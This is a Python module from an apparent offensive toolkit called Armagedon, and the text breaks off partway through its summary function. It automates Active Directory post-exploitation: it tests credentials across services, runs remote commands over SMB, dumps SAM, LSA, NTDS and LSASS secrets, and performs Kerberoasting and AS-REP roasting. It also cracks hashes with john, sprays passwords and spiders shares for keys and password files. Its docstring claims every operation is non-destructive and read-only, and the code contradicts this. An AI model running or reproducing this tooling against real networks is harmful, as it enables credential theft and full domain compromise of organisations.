"""
Armagedon AD Post-Exploitation Enumeration Module

Full automated AD post-exploitation loop: credential testing, host enumeration,
credential dumping, LDAP enumeration, Kerberoasting, hash cracking, password
spraying, and shared drives enumeration. Mirrors the standalone ad_post_enum.sh workflow.

Tools used: nxc (NetExec), impacket (GetUserSPNs/GetNPUsers), john, nmap, xfreerdp.
All operations are non-destructive READ in CHECK mode.
"""

import subprocess
import shutil
import os
import re
import json
import time
import tempfile
import logging
from datetime import datetime
from pathlib import Path

log = logging.getLogger("armagedon.modules.post.ad_post_enum")

CVE = "N/A"
DESCRIPTION = "AD Post-Exploitation Enumeration — Full automated AD post-exploitation loop"
PLATFORM = "Windows"
RANK = "normal"
AUTHOR = "Armagedon"
DISCLOSURE = "N/A"

SAFE_MODE = int(os.environ.get("ARMAGEDON_SAFE_MODE", "1"))
SAFETY_LEVEL = "LOW"  # read-only enumeration + credential extraction

OPTIONS = {
    "RHOSTS": "",
    "RPORT": 445,
    "USERNAME": "",
    "PASSWORD": "",
    "DOMAIN": "",
    "OUTPUT_DIR": "",
    "MODE": "FULL",
    "STEPS": "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY,SHARE",
    "WORDLIST": "/usr/share/wordlists/rockyou.txt",
    "VERBOSE": False,
}

REQUIRED = {"RHOSTS": True, "USERNAME": True, "PASSWORD": True, "DOMAIN": True}
DESCRIPTIONS = {
    "RHOSTS": "Target DC or domain-joined host IP",
    "RPORT": "Primary service port (default 445)",
    "USERNAME": "Username for authentication (e.g. visitor, admin@corp.local)",
    "PASSWORD": "Password for authentication",
    "DOMAIN": "Active Directory domain (e.g. COOCTUS.CORP)",
    "OUTPUT_DIR": "Output directory (auto-generated if empty)",
    "MODE": "FULL | ENUM | DUMP | KERB | CRACK | SPRAY (which stages to run)",
    "STEPS": "Comma-separated step list: TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY,SHARE",
    "WORDLIST": "John wordlist for hash cracking",
    "VERBOSE": "Print every nxc/impacket command output",
}


# ─── Tool helpers ──────────────────────────────────────────────────────────────

def _find_nxc():
    return shutil.which("nxc")


def _find_john():
    return shutil.which("john")


def _find_impacket(tool):
    """Find impacket tool (impacket-GetUserSPNs or GetUserSPNs.py)."""
    path = shutil.which(f"impacket-{tool}")
    if path:
        return path
    return shutil.which(f"{tool}.py")


def _run_cmd(cmd, timeout=120, capture=True):
    """Run a shell command, return (stdout, stderr, returncode)."""
    try:
        r = subprocess.run(
            cmd, shell=isinstance(cmd, str),
            capture_output=capture, text=True, timeout=timeout,
        )
        return r.stdout or "", r.stderr or "", r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except Exception as e:
        return "", str(e), -1


def _nxc_run(service, target, user, passwd, extra_args="", timeout=60):
    """Run nxc command and return output."""
    nxc = _find_nxc()
    if not nxc:
        return ""
    # Build user formats: bare, DOMAIN\user, user@domain
    bare = user
    if "\\" in user:
        bare = user.split("\\", 1)[1]
    if "@" in user:
        bare = user.split("@")[0]

    domain = OPTIONS.get("DOMAIN", "")
    formats = [bare]
    if domain:
        formats.append(f"{domain}\\{bare}")
        formats.append(f"{bare}@{domain.lower()}")

    for fmt in formats:
        cmd = f'{nxc} {service} {target} -u "{fmt}" -p "{passwd}" {extra_args}'
        stdout, stderr, rc = _run_cmd(cmd, timeout=timeout)
        output = stdout + stderr
        if "PWND!" in output or "[+]" in output:
            return output, fmt
    return "", ""


def _exec_smb(target, user, passwd, cmd_str, timeout=60):
    """Execute a command on target via nxc smb -x."""
    nxc = _find_nxc()
    if not nxc:
        return ""
    full = f'{nxc} smb {target} -u "{user}" -p "{passwd}" -x "{cmd_str}"'
    stdout, _, _ = _run_cmd(full, timeout=timeout)
    return stdout


# ─── Save helpers ──────────────────────────────────────────────────────────────

def _save_cred(output_dir, domain, user, passwd, source="initial"):
    """Append credential to all_creds.txt."""
    cred_file = os.path.join(output_dir, "all_creds.txt")
    with open(cred_file, "a") as f:
        f.write(f"{domain}\\{user}:{passwd} (Source: {source})\n")
    print(f"  [+] Credential saved: {domain}\\{user}:{passwd}")


def _save_hash(output_dir, hash_line, source="unknown"):
    """Append hash line to all_hashes.txt."""
    hash_file = os.path.join(output_dir, "all_hashes.txt")
    with open(hash_file, "a") as f:
        f.write(hash_line + "\n")
    print(f"  [+] Hash saved ({source})")


# ─── Stage: Test credentials ──────────────────────────────────────────────────

def _test_credentials(target, user, passwd, domain, output_dir):
    """Test credentials on SMB, WinRM, RDP, LDAP. Returns dict of results."""
    print(f"\n{'='*60}")
    print("  STAGE 1: Testing Credentials on All Services")
    print(f"{'='*60}")

    _save_cred(output_dir, domain, user, passwd, "initial")

    services = ["smb", "winrm", "rdp", "ldap"]
    results = {}
    any_pwnd = False
    rdp_pwnd = False
    working_user = user

    for svc in services:
        output, fmt_used = _nxc_run(svc, target, user, passwd)
        if output:
            if "PWND!" in output:
                print(f"  [+] {svc.upper()} PWND!  (user format: {fmt_used})")
                results[svc] = {"status": "pwnd", "user_format": fmt_used}
                any_pwnd = True
                if svc == "rdp":
                    rdp_pwnd = True
                if fmt_used != user:
                    _save_cred(output_dir, domain, fmt_used, passwd, "auto-format-fix")
                    working_user = fmt_used
            elif "[+]" in output:
                print(f"  [+] {svc.upper()} accessible (user format: {fmt_used})")
                results[svc] = {"status": "accessible", "user_format": fmt_used}
                any_pwnd = True
                if svc == "rdp":
                    rdp_pwnd = True
                if fmt_used != user:
                    _save_cred(output_dir, domain, fmt_used, passwd, "auto-format-fix")
                    working_user = fmt_used
            else:
                print(f"  [-] {svc.upper()} failed")
                results[svc] = {"status": "failed"}
        else:
            print(f"  [-] {svc.upper()} failed (no response)")
            results[svc] = {"status": "failed"}

    # RDP screenshot
    if rdp_pwnd:
        _rdp_screenshot(target, working_user, passwd, output_dir)

    return {"any_pwnd": any_pwnd, "rdp_pwnd": rdp_pwnd,
            "working_user": working_user, "services": results}


def _rdp_screenshot(target, user, passwd, output_dir):
    """Take RDP screenshot with NLA fallback."""
    print("  [*] Taking RDP screenshot...")
    nxc = _find_nxc()
    ss_path = os.path.join(output_dir, "rdp_screenshot.png")
    if nxc:
        cmd = f'{nxc} rdp {target} -u "{user}" -p "{passwd}" --nla-screenshot'
        stdout, _, _ = _run_cmd(cmd, timeout=30)
        if stdout:
            with open(ss_path, "w") as f:
                f.write(stdout)
            print(f"  [+] RDP screenshot saved to {ss_path}")
        else:
            print("  [!] RDP screenshot failed")
    else:
        # Fallback: nmap RDP info
        nmap = shutil.which("nmap")
        if nmap:
            info_path = os.path.join(output_dir, "rdp_info.txt")
            _run_cmd(f'{nmap} -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption {target}',
                     timeout=30)
            print(f"  [!] RDP info saved to {info_path}")


# ─── Stage: Shared drives enumeration ────────────────────────────────────────

def _enumerate_shares(target, user, passwd, domain, output_dir):
    """Enumerate all accessible SMB shares, check permissions, spider content.

    Steps:
      1. nxc --shares  → list all shares with READ/WRITE/DENY access flags
      2. nxc --dir     → list root content of every accessible share
      3. nxc --spider  → spider accessible shares for interesting files
      4. net view       → secondary share listing via SMB exec
      5. net view \\\\host → discover other hosts, then enumerate their shares
    """
    print(f"\n{'='*60}")
    print("  STAGE: Shared Drives Enumeration")
    print(f"{'='*60}")

    share_dir = os.path.join(output_dir, "shares")
    os.makedirs(share_dir, exist_ok=True)

    nxc = _find_nxc()
    if not nxc:
        print("  [-] nxc not found — skipping share enumeration")
        return {"shares_found": 0, "accessible": 0}

    bare = user
    if "\\" in user:
        bare = user.split("\\", 1)[1]
    if "@" in user:
        bare = user.split("@")[0]

    user_fmt = f"{domain}\\{bare}" if domain else bare

    shares_found = []
    accessible_shares = []
    lateral_hosts = []

    # ── Step 1: nxc --shares ──────────────────────────────────────────────
    print("  [1/5] Enumerating shares via nxc --shares ...")
    cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --shares'
    stdout, _, rc = _run_cmd(cmd, timeout=60)

    shares_file = os.path.join(share_dir, "all_shares.txt")
    with open(shares_file, "w") as f:
        f.write(f"# nxc --shares output for {target}\n")
        f.write(f"# User: {domain}\\{bare}\n")
        f.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")
        f.write(stdout or "(no output)")

    # Extract target's NetBIOS name from banner (e.g. "(name:DC)")
    target_netbios = ""
    if stdout:
        m = re.search(r'\(name:(\S+?)\)', stdout)
        if m:
            target_netbios = m.group(1).lower()

    if stdout:
        in_table = False
        for line in stdout.splitlines():
            # nxc output format:
            #   SMB   IP   PORT   HOST   Share           Permissions            Remark
            #   SMB   IP   PORT   HOST   -----           -----------            ------
            #   SMB   IP   PORT   HOST   ADMIN$                                 Remote Admin
            #   SMB   IP   PORT   HOST   Home            READ                   description
            #
            # Strategy: find the "Share" header line, skip dashes, then parse columns.

            # Detect header row: contains "Share" followed by "Permissions" or whitespace
            if re.search(r'\bShare\b.*\bPermission', line, re.IGNORECASE):
                in_table = True
                continue

            # Skip separator line (----...----)
            if in_table and re.match(r'.*\s-{3,}\s', line):
                continue

            if not in_table:
                continue

            # Strip nxc prefix (everything before the share name column)
            # nxc prints: "SMB   10.49.134.136   445    DC               HOME"
            # We find the share name by looking for the column that comes after the 4th whitespace group
            # Simpler: split on 2+ whitespace, skip first 4 tokens (SMB IP PORT HOST)
            stripped = re.sub(r'^\S+\s+\S+\s+\S+\s+\S+\s+', '', line).strip()
            if not stripped:
                continue

            # Now stripped looks like: "Home            READ                   description"
            # Split into columns by 2+ whitespace
            cols = re.split(r'\s{2,}', stripped)
            if not cols or not cols[0]:
                continue

            share_name = cols[0].strip()
            # Skip if it's a header/dashes
            if share_name.lower() in ("share", "-----", "---", "name") or set(share_name) <= {'-'}:
                continue

            # Permissions is usually the second column
            permissions = cols[1].upper() if len(cols) > 1 else ""
            remark = cols[2] if len(cols) > 2 else ""

            # If permissions doesn't look like an actual permission value,
            # it's likely the remark column shifted — nxc omits permissions
            # for shares where it can't determine access (e.g. ADMIN$, C$)
            real_permission_keywords = {"READ", "WRITE", "FULL", "DENY", "NO ACCESS", "NO", ""}
            access = "UNKNOWN"
            if permissions in real_permission_keywords or permissions == "":
                # Standard permission value
                if "WRITE" in permissions or "FULL" in permissions:
                    access = "WRITE"
                elif "READ" in permissions:
                    access = "READ"
                elif "DENY" in permissions or "NO ACCESS" in permissions:
                    access = "DENY"
                else:
                    # Blank — need to probe with --dir
                    access = "CHECK"
            else:
                # Not a permission keyword — likely the remark, so access is unknown
                access = "CHECK"

            shares_found.append({"name": share_name, "access": access, "remark": remark})

    print(f"  [+] Found {len(shares_found)} shares via nxc --shares")

    # ── Step 2: nxc --dir for every accessible share ──────────────────────
    print("  [2/5] Listing content of accessible shares ...")
    dir_outputs = {}  # share_name -> raw output
    for sh in shares_found:
        name = sh["name"]
        if sh["access"] == "DENY":
            continue
        # CHECK means blank permissions — try --dir to confirm access
        if sh["access"] == "CHECK":
            dir_cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --share {name} --dir'
            dir_out, _, dir_rc = _run_cmd(dir_cmd, timeout=30)
            if dir_out and "STATUS_ACCESS_DENIED" not in dir_out and "Error" not in dir_out:
                sh["access"] = "READ"
                accessible_shares.append(name)
            else:
                sh["access"] = "DENY"
        elif sh["access"] in ("READ", "WRITE"):
            accessible_shares.append(name)

        if sh["access"] in ("DENY",):
            continue

        print(f"      [*] {name} ({sh['access']}) — listing root ...")
        dir_cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --share {name} --dir'
        dir_out, _, _ = _run_cmd(dir_cmd, timeout=30)
        dir_outputs[name] = dir_out or ""

        safe_name = re.sub(r'[^\w\-.]', '_', name)
        dir_file = os.path.join(share_dir, f"{safe_name}_dir.txt")
        with open(dir_file, "w") as f:
            f.write(f"# Share: {name}  Access: {sh['access']}\n\n")
            f.write(dir_out or "(empty or access denied)")
        print(f"          → {dir_file}")

    if not accessible_shares:
        print("  [-] No accessible shares found (all DENY or none listed)")

    # ── Step 3: Scan --dir output + spider for interesting files ───────────
    print("  [3/5] Scanning share contents for interesting files ...")
    interesting_patterns = (
        r"\.txt$|\.doc$|\.docx$|\.pdf$|\.xlsx$|\.csv$"
        r"|\.kdbx$|\.config$|\.xml$|\.json$|\.ini$"
        r"|password|secret|credential|backup|confidential"
        r"|\.kdb|\.pfx$|\.pem$|\.key$|\.ppk$"
    )
    spider_results = []

    # Scan --dir output (already captured in Step 2)
    for share_name in accessible_shares:
        dir_out = dir_outputs.get(share_name, "")
        for line in dir_out.splitlines():
            line_clean = re.sub(r'^\S+\s+\S+\s+\S+\s+\S+\s+', '', line).strip()
            if re.search(interesting_patterns, line_clean, re.IGNORECASE):
                spider_results.append({"share": share_name, "file": line_clean})

    # Also try nxc --spider for deeper recursion (best-effort)
    for share_name in accessible_shares:
        print(f"      [*] Spidering {share_name} ...")
        spider_cmd = (
            f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" '
            f'--share {share_name} --spider {share_name} '
            f'--spider-folder "." --content'
        )
        spider_out, _, _ = _run_cmd(spider_cmd, timeout=120)

        safe_name = re.sub(r'[^\w\-.]', '_', share_name)
        spider_file = os.path.join(share_dir, f"{safe_name}_spider.txt")
        with open(spider_file, "w") as f:
            f.write(f"# Spider results for {share_name}\n\n")
            f.write(spider_out or "(no output)")

        for line in (spider_out or "").splitlines():
            line_clean = re.sub(r'^\S+\s+\S+\s+\S+\s+\S+\s+', '', line).strip()
            if re.search(interesting_patterns, line_clean, re.IGNORECASE):
                # Avoid duplicates
                entry = {"share": share_name, "file": line_clean}
                if entry not in spider_results:
                    spider_results.append(entry)

    if spider_results:
        interesting_file = os.path.join(share_dir, "interesting_files.txt")
        with open(interesting_file, "w") as f:
            f.write(f"# Interesting files found on shares\n\n")
            for item in spider_results:
                f.write(f"[{item['share']}] {item['file']}\n")
        print(f"  [+] {len(spider_results)} interesting files flagged → {interesting_file}")
    else:
        print("  [-] No obviously interesting files found during spider")

    # ── Step 4: Discover other domain computers via LDAP ──────────────────
    # NOTE: nxc smb -x 'net view' never captures output (nxc limitation).
    # We use nxc ldap -M dump-computers instead — far more reliable.
    print("  [4/5] Discovering other domain-joined computers ...")
    hosts_from_ldap = []
    ldap_dump = f'{nxc} ldap {target} -u "{user_fmt}" -p "{passwd}" -M dump-computers'
    ldap_out, _, _ = _run_cmd(ldap_dump, timeout=30)
    ldap_file = os.path.join(share_dir, "ldap_computers.txt")
    with open(ldap_file, "w") as f:
        f.write(f"# LDAP computer enumeration from {target}\n\n")
        f.write(ldap_out or "(no output — visitor may lack LDAP enumeration rights)")

    for line in (ldap_out or "").splitlines():
        # nxc dump-computers: "DC.COOCTUS.CORP (Windows Server 2019 Standard)"
        m = re.search(r'([A-Z][A-Z0-9._-]+)\s+\(', line)
        if m:
            fqdn = m.group(1)
            short = fqdn.split('.')[0]
            if short.lower() != target.lower() and fqdn.lower() != target.lower():
                hosts_from_ldap.append(fqdn)

    hosts_from_ldap = list(dict.fromkeys(hosts_from_ldap))
    # Filter out hosts that are the target itself:
    #  1. Short name matches target IP
    #  2. FQDN matches target IP
    #  3. Short name matches DC's NetBIOS name from nxc banner (e.g. "DC")
    filtered = []
    for h in hosts_from_ldap:
        short = h.split('.')[0].lower()
        if short == target.lower() or h.lower() == target.lower():
            continue
        if target_netbios and short == target_netbios:
            continue
        filtered.append(h)
    hosts_from_ldap = filtered

    if hosts_from_ldap:
        print(f"  [+] Discovered {len(hosts_from_ldap)} other hosts via LDAP")
        hosts_file = os.path.join(share_dir, "discovered_hosts.txt")
        with open(hosts_file, "w") as f:
            for h in hosts_from_ldap:
                f.write(h + "\n")
    else:
        print("  [-] No other hosts discovered (visitor may lack LDAP enumeration rights)")

    # ── Step 5: Enumerate shares on discovered hosts ──────────────────────
    print("  [5/5] Enumerating shares on other domain hosts ...")
    for host in hosts_from_ldap:
        if host.lower() == target.lower():
            continue
        print(f"      [*] {host} — listing shares ...")
        hcmd = f'{nxc} smb {host} -u "{user_fmt}" -p "{passwd}" --shares'
        hout, _, hrc = _run_cmd(hcmd, timeout=45)
        if hout:
            hfile = os.path.join(share_dir, f"shares_{re.sub(r'[^\\w\\-.]', '_', host)}.txt")
            with open(hfile, "w") as f:
                f.write(f"# Shares on {host}\n\n")
                f.write(hout)
            # Parse fixed-width nxc --shares output (same parser as Step 1)
            hlines = hout.splitlines()
            found_header = False
            for hline in hlines:
                if re.search(r'Share\s+Permissions', hline, re.IGNORECASE):
                    found_header = True
                    continue
                if re.match(r'^\s*-+\s+-+\s+-+', hline.strip()):
                    continue
                if not found_header:
                    continue
                stripped = re.sub(r'^\S+\s+\S+\s+\S+\s+\S+\s+', '', hline).strip()
                parts = stripped.split()
                if not parts:
                    continue
                share_name = parts[0]
                if share_name.lower() in ("sharename", "share", "name", "-----"):
                    continue
                rest = " ".join(parts[1:]).upper()
                if any(kw in rest for kw in ("WRITE", "FULL")):
                    acc = "WRITE"
                elif "READ" in rest:
                    acc = "READ"
                else:
                    acc = "CHECK"
                lateral_hosts.append({"host": host, "share": share_name, "access": acc})
            if any(lh["host"] == host for lh in lateral_hosts):
                print(f"          → accessible shares on {host}")

    if lateral_hosts:
        lateral_file = os.path.join(share_dir, "lateral_shares.txt")
        with open(lateral_file, "w") as f:
            f.write(f"# Accessible shares on other domain hosts\n\n")
            for lh in lateral_hosts:
                f.write(f"[{lh['host']}] {lh['share']} ({lh['access']})\n")
        print(f"  [+] {len(lateral_hosts)} accessible shares on other hosts → {lateral_file}")

    # ── Summary ────────────────────────────────────────────────────────────
    total_accessible = len(accessible_shares) + len([lh for lh in lateral_hosts])
    summary = {
        "shares_found": len(shares_found),
        "accessible": total_accessible,
        "spider_hits": len(spider_results),
        "lateral_hosts": len(set(lh["host"] for lh in lateral_hosts)),
        "lateral_shares": len(lateral_hosts),
        "output_dir": share_dir,
    }
    print(f"\n  [+] Share enumeration complete — {summary['accessible']} accessible shares across "
          f"{summary['lateral_hosts'] + 1} hosts → {share_dir}")
    return summary


# ─── Stage: Full enumeration ──────────────────────────────────────────────────

def _full_enum(target, user, passwd, domain, output_dir):
    """Full host enumeration via SMB exec commands."""
    print(f"\n{'='*60}")
    print("  STAGE 2: Full Host Enumeration")
    print(f"{'='*60}")

    enum_dir = os.path.join(output_dir, f"compromised_{user}")
    os.makedirs(enum_dir, exist_ok=True)

    commands = {
        "systeminfo.txt": "systeminfo",
        "ipconfig.txt": "ipconfig /all",
        "hostname.txt": "hostname",
        "local_users.txt": "net user",
        "local_admins.txt": "net localgroup administrators",
        "domain_users.txt": "net user /domain",
        "domain_admins.txt": 'net group "Domain Admins" /domain',
        "enterprise_admins.txt": 'net group "Enterprise Admins" /domain',
        "tasklist.txt": "tasklist /svc",
        "netstat.txt": "netstat -ano",
        "password_policy.txt": "net accounts",
        "saved_creds.txt": "cmdkey /list",
        "autologon.txt": 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        "txt_files.txt": 'where /R C:\\Users *.txt',
        "keepass_files.txt": 'where /R C:\\Users *.kdbx',
        "config_files.txt": 'where /R C:\\Users *.config',
    }

    count = 0
    for fname, cmd_str in commands.items():
        print(f"  [*] {fname.replace('.txt', '').replace('_', ' ').title()}...")
        output = _exec_smb(target, user, passwd, cmd_str, timeout=45)
        if output:
            with open(os.path.join(enum_dir, fname), "w") as f:
                f.write(output)
            count += 1

    print(f"  [+] Enumeration complete — {count} files in {enum_dir}")
    return {"output_dir": enum_dir, "files": count}


# ─── Stage: Credential dumping ────────────────────────────────────────────────

def _dump_creds(target, user, passwd, domain, output_dir):
    """Dump SAM, LSA, NTDS, LSASS via nxc."""
    print(f"\n{'='*60}")
    print("  STAGE 3: Credential Dumping")
    print(f"{'='*60}")

    dump_dir = os.path.join(output_dir, f"dumps_{user}")
    os.makedirs(dump_dir, exist_ok=True)

    nxc = _find_nxc()
    if not nxc:
        print("  [-] nxc not found — skipping credential dump")
        return {"sam": [], "lsa": [], "ntds": [], "lsass": []}

    creds = {"sam": [], "lsa": [], "ntds": [], "lsass": []}

    # SAM
    print("  [*] Dumping SAM...")
    sam_file = os.path.join(dump_dir, "sam.txt")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --sam'
    stdout, _, _ = _run_cmd(cmd, timeout=90)
    if stdout:
        with open(sam_file, "w") as f:
            f.write(stdout)
        # Extract NTLM hashes: SID:RID:LM:NTLM:::
        for line in stdout.splitlines():
            m = re.search(r":(\d{5}):[a-f0-9]{32}:", line)
            if m:
                creds["sam"].append(line.strip())
                _save_hash(output_dir, line.strip(), "SAM")
        print(f"  [+] SAM: {len(creds['sam'])} hashes")
    else:
        print("  [-] SAM dump failed")

    # LSA
    print("  [*] Dumping LSA...")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --lsa'
    stdout, _, _ = _run_cmd(cmd, timeout=90)
    if stdout:
        with open(os.path.join(dump_dir, "lsa.txt"), "w") as f:
            f.write(stdout)
        print("  [+] LSA dumped successfully")

    # NTDS
    print("  [*] Attempting NTDS dump...")
    ntds_file = os.path.join(dump_dir, "ntds.txt")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --ntds'
    stdout, _, _ = _run_cmd(cmd, timeout=180)
    if stdout:
        with open(ntds_file, "w") as f:
            f.write(stdout)
        for line in stdout.splitlines():
            m = re.search(r":(\d{5}):[a-f0-9]{32}:", line)
            if m:
                creds["ntds"].append(line.strip())
                _save_hash(output_dir, line.strip(), "NTDS")
        print(f"  [+] NTDS: {len(creds['ntds'])} hashes")
    else:
        print("  [-] NTDS dump failed (may not be a DC)")

    # LSASS
    print("  [*] Attempting LSASS dump...")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" -M lsassy'
    stdout, _, _ = _run_cmd(cmd, timeout=60)
    if stdout:
        with open(os.path.join(dump_dir, "lsass.txt"), "w") as f:
            f.write(stdout)
        print("  [+] LSASS dumped successfully")

    total = sum(len(v) for v in creds.values())
    print(f"  [+] Total credentials extracted: {total}")
    return creds


# ─── Stage: LDAP enumeration ──────────────────────────────────────────────────

def _ldap_enum(target, user, passwd, domain, output_dir):
    """LDAP enumeration: LAPS, GMSA, delegation, kerberoastable, AS-REP."""
    print(f"\n{'='*60}")
    print("  STAGE 4: LDAP Enumeration")
    print(f"{'='*60}")

    ldap_dir = os.path.join(output_dir, f"ldap_{user}")
    os.makedirs(ldap_dir, exist_ok=True)

    nxc = _find_nxc()
    if not nxc:
        print("  [-] nxc not found — skipping LDAP enumeration")
        return {}

    checks = {
        "laps.txt": "-M laps",
        "gmsa.txt": "-M get-gmsa",
        "delegation.txt": "-M find-delegation",
        "kerberoast.txt": "-M kerberoast",
        "asrep.txt": "-M asreproast",
    }

    results = {}
    for fname, module_arg in checks.items():
        label = fname.replace(".txt", "").replace("_", " ").title()
        print(f"  [*] Checking {label}...")
        cmd = f'{nxc} ldap {target} -u "{user}" -p "{passwd}" {module_arg}'
        stdout, _, _ = _run_cmd(cmd, timeout=60)
        if stdout:
            with open(os.path.join(ldap_dir, fname), "w") as f:
                f.write(stdout)
            results[fname.replace(".txt", "")] = stdout
            print(f"  [+] {label} complete")
        else:
            print(f"  [-] {label} returned no output")

    print(f"  [+] LDAP enumeration complete — results in {ldap_dir}")
    return results


# ─── Stage: Kerberoasting ─────────────────────────────────────────────────────

def _kerberoast(target, user, passwd, domain, output_dir):
    """Kerberoast SPN accounts via GetUserSPNs."""
    print(f"\n{'='*60}")
    print("  STAGE 5: Kerberoasting")
    print(f"{'='*60}")

    tool = _find_impacket("GetUserSPNs")
    if not tool:
        print("  [-] impacket-GetUserSPNs not found — skipping")
        return ""

    timestamp = datetime.now().strftime("%H%M%S")
    outfile = os.path.join(output_dir, f"kerberoast_{timestamp}.txt")

    auth = f"{domain}/{user}:{passwd}"
    cmd = f'{tool} -dc-ip {target} {auth} -request -outputfile {outfile}'
    stdout, stderr, rc = _run_cmd(cmd, timeout=120)

    if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
        print(f"  [+] Kerberoast hashes saved to {outfile}")
        return outfile
    else:
        print("  [-] Kerberoast failed — no SPNs or authentication error")
        if stdout:
            print(f"      {stdout[:200]}")
        return ""


# ─── Stage: AS-REP Roasting ───────────────────────────────────────────────────

def _asreproast(target, user, passwd, domain, output_dir):
    """AS-REP roast accounts without pre-auth required."""
    print(f"\n{'='*60}")
    print("  STAGE 5b: AS-REP Roasting")
    print(f"{'='*60}")

    tool = _find_impacket("GetNPUsers")
    if not tool:
        print("  [-] impacket-GetNPUsers not found — skipping")
        return ""

    timestamp = datetime.now().strftime("%H%M%S")
    outfile = os.path.join(output_dir, f"asrep_{timestamp}.txt")

    auth = f"{domain}/{user}:{passwd}"
    cmd = f'{tool} {domain}/ -usersfile <(echo {user}) -dc-ip {target} -format hashcat -outputfile {outfile}'
    stdout, stderr, rc = _run_cmd(cmd, timeout=60)

    if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
        print(f"  [+] AS-REP hashes saved to {outfile}")
        return outfile
    else:
        print("  [-] AS-REP roast failed or no roastable accounts")
        return ""


# ─── Stage: Crack hashes ──────────────────────────────────────────────────────

def _crack_hashes(output_dir, wordlist):
    """Crack NTLM and Kerberoast hashes with john."""
    print(f"\n{'='*60}")
    print("  STAGE 6: Cracking Captured Hashes")
    print(f"{'='*60}")

    john = _find_john()
    if not john:
        print("  [-] john not found — skipping cracking")
        return {}

    cracked = {"ntlm": [], "kerb": []}

    # Crack NTLM hashes
    hash_file = os.path.join(output_dir, "all_hashes.txt")
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        print("  [*] Cracking NTLM hashes...")
        _run_cmd(f'{john} --format=NT --wordlist={wordlist} {hash_file}', timeout=600)
        stdout, _, _ = _run_cmd(f'{john} --show --format=NT {hash_file}', timeout=30)
        if stdout:
            cracked_file = os.path.join(output_dir, "cracked_ntlm.txt")
            with open(cracked_file, "w") as f:
                f.write(stdout)
            for line in stdout.splitlines():
                if ":" in line:
                    cracked["ntlm"].append(line.strip())
            print(f"  [+] NTLM cracked: {len(cracked['ntlm'])} passwords")
    else:
        print("  [-] No NTLM hashes to crack")

    # Crack Kerberoast hashes
    for kerb_file in sorted(Path(output_dir).glob("kerberoast_*.txt")):
        if kerb_file.stat().st_size > 0:
            print(f"  [*] Cracking {kerb_file.name}...")
            _run_cmd(f'{john} --format=krb5tgs --wordlist={wordlist} {kerb_file}',
                     timeout=600)
            stdout, _, _ = _run_cmd(f'{john} --show --format=krb5tgs {kerb_file}',
                                    timeout=30)
            if stdout:
                for line in stdout.splitlines():
                    if ":" in line:
                        cracked["kerb"].append(line.strip())
                print(f"  [+] Kerberoast cracked: {len(cracked['kerb'])} passwords")

    total = len(cracked["ntlm"]) + len(cracked["kerb"])
    print(f"  [+] Total cracked: {total}")
    return cracked


# ─── Stage: Password spray ────────────────────────────────────────────────────

def _password_spray(target, user, passwd, domain, output_dir):
    """Password spray discovered passwords across domain users."""
    print(f"\n{'='*60}")
    print("  STAGE 7: Password Spraying")
    print(f"{'='*60}")

    nxc = _find_nxc()
    if not nxc:
        print("  [-] nxc not found — skipping spray")
        return []

    # Gather usernames from domain_users.txt or from previous enumeration
    users_file = os.path.join(output_dir, "domain_users.txt")
    if not os.path.exists(users_file) or os.path.getsize(users_file) == 0:
        # Try to extract from enum files
        all_users = set()
        for f in Path(output_dir).rglob("*.txt"):
            try:
                content = f.read_text(errors="ignore")
                # Match DOMAIN\username pattern
                found = re.findall(rf"{re.escape(domain)}\\\\([a-zA-Z0-9._-]+)", content)
                all_users.update(found)
            except Exception:
                pass
        if all_users:
            with open(users_file, "w") as f:
                f.write("\n".join(sorted(all_users)))
        else:
            print("  [-] No users to spray — run LDAP enumeration first")
            return []

    print(f"  [*] Spraying {passwd} across users from {users_file}...")
    cmd = f'{nxc} smb {target} -u {users_file} -p "{passwd}" --continue-on-success'
    stdout, _, _ = _run_cmd(cmd, timeout=300)

    spray_file = os.path.join(output_dir, "spray_results.txt")
    if stdout:
        with open(spray_file, "w") as f:
            f.write(stdout)

        # Parse successful logons
        valid = []
        for line in stdout.splitlines():
            if "PWND!" in line or ("[+]" in line and "STATUS_LOGON_FAILURE" not in line):
                valid.append(line.strip())
                print(f"  [+] Valid: {line.strip()[:80]}")

        print(f"  [+] Spray complete — {len(valid)} valid credentials found")
        return valid
    else:
        print("  [-] Spray returned no results")
        return []


# ─── Stage: Test cracked passwords ────────────────────────────────────────────

def _test_cracked(target, cracked, domain, output_dir):
    """Test cracked passwords on SMB, WinRM, RDP."""
    print(f"\n{'='*60}")
    print("  STAGE 8: Testing Cracked Passwords on Other Services")
    print(f"{'='*60}")

    tested = 0
    for entry in cracked:
        parts = entry.split(":")
        if len(parts) < 2:
            continue
        cr_user = parts[0]
        cr_pass = parts[1]
        if not cr_pass:
            continue

        print(f"  [*] Testing {domain}\\{cr_user}:{cr_pass}")
        _save_cred(output_dir, domain, cr_user, cr_pass, "cracked")

        for svc in ["smb", "winrm", "rdp"]:
            output, fmt = _nxc_run(svc, target, cr_user, cr_pass)
            if output and ("PWND!" in output or "[+]" in output):
                print(f"  [+] {svc.upper()} accessible with cracked creds")
                tested += 1

    print(f"  [+] Tested {tested} service access with cracked creds")
    return tested


# ─── Summary ───────────────────────────────────────────────────────────────────

def _print_summary(output_dir, domain):
    """Print final summary of all results."""
    print(f"\n{'='*60}")
    print("  SUMMARY")
    print(f"{'='*60}")

    creds_file = os.path.join(output_dir, "all_creds.txt")
    hashes_file = os.path.join(output_dir, "all_hashes.txt")

    print(f"  Output directory:  {output_dir}")
    print(f"  Credentials file: {creds_file}")
    print(f"  Hashes file:      {hashes_file}")

    if os.path.exists(creds_file):
